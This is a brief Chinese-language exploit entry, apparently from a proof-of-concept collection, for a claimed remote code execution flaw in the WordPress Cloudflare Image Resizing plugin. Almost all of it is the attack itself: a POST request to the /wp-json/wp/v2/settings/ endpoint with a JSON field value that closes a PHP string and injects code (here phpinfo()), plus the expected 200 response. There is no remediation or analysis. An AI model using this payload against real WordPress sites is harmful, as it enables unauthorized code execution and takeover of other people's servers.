# WordPressCloudflareImageResizing插件存在前台代码执行漏洞(RCE)

WordPress ｜ 命令执行 ｜ —
- **请求**：`POST /wp-json/wp/v2/settings/ HTTP/1.1`

**Payload**
```
{"cf_image_resizing_fit": "'); phpinfo(); /*"}
```
- **响应特征**：200